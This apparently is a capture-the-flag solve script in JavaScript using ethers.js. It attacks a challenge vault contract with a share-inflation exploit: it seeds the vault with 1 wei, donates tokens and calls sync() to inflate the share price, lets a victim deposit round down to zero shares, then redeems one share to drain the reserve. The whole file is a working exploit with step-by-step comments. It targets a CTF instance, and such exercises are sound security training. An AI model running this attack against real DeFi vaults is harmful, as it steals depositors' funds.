import {JsonRpcProvider, Contract, Wallet, computeAddress} from "ethers";

const RPC = "https://web-a51c34fe922c90e8.web.h7tex.com";
const SETUP = "0xD393844Da0Fa5EaDC271929623B82f3B8f4E3efd";
const KEY = process.env.CTF_PK || "0x<private key that GET / of the instance prints>";
if (!KEY.startsWith("0x") || KEY.length !== 66) {
  console.error("set CTF_PK to the 64-hex private key printed by GET " + RPC);
  process.exit(1);
}
const VICTIM = "0x0000000000000000000000000000000000C0FFEE";

const p = new JsonRpcProvider(RPC);
const w = new Wallet(KEY, p);
const player = computeAddress(KEY);
const e = (x) => Number(x) / 1e18;
const g = {gasLimit: 5000000n};

const setup = new Contract(SETUP, [
  "function vault() view returns (address)",
  "function token() view returns (address)",
  "function victimDeposit()",
  "function isSolved() view returns (bool)",
  "function victimDeposited() view returns (bool)",
], w);
const vaultAddr = await setup.vault();
const tokenAddr = await setup.token();
const token = new Contract(tokenAddr, [
  "function approve(address,uint256) returns (bool)",
  "function transfer(address,uint256) returns (bool)",
  "function balanceOf(address) view returns (uint256)",
], w);
const vault = new Contract(vaultAddr, [
  "function deposit(uint256,address) returns (uint256)",
  "function redeem(uint256,address,address) returns (uint256)",
  "function sync()",
  "function balanceOf(address) view returns (uint256)",
  "function totalSupply() view returns (uint256)",
  "function reserve() view returns (uint256)",
  "function convertToShares(uint256) view returns (uint256)",
], w);
console.log("player", player, "vault", vaultAddr, "token", tokenAddr);

const show = async (tag) => {
  console.log(
    tag.padEnd(10),
    "tok(vault)=", e(await token.balanceOf(vaultAddr)).toFixed(4),
    "reserve=", (await vault.reserve()).toString(),
    "supply=", (await vault.totalSupply()).toString(),
    "share(victim)=", (await vault.balanceOf(VICTIM)).toString(),
    "share(me)=", (await vault.balanceOf(player)).toString(),
    "tok(me)=", e(await token.balanceOf(player)).toFixed(4),
    "solved=", await setup.isSolved()
  );
};
await show("initial");

const send = async (label, tx) => {
  const rc = await (await tx).wait();
  console.log(label, rc.status === 1 ? "ok" : "FAILED", "gas=" + rc.gasUsed, "block=" + rc.blockNumber);
};

// 1. dust seed: supply == 0, so shares == assets == 1 wei
await send("approve1", token.approve(vaultAddr, 1, g));
await send("deposit1", vault.deposit(1, player, g));
await show("seeded");

// 2. donate the rest directly, then sync() to fold it into the share price
const donate = await token.balanceOf(player);
await send("donate", token.transfer(vaultAddr, donate, g));
await send("sync", vault.sync(g));
console.log("  reserve/supply after sync:", (await vault.reserve()).toString(), "/", (await vault.totalSupply()).toString());
console.log("  victim's 100e18 would buy", (await vault.convertToShares(100n * 10n ** 18n)).toString(), "shares");
await show("inflated");

// 3. let the anchor in: their stake rounds down to zero shares
await send("victimDep", setup.victimDeposit(g));
await show("deposited");

// 4. one share now redeems the whole reserve
await send("redeem", vault.redeem(1, player, player, g));
await show("drained");
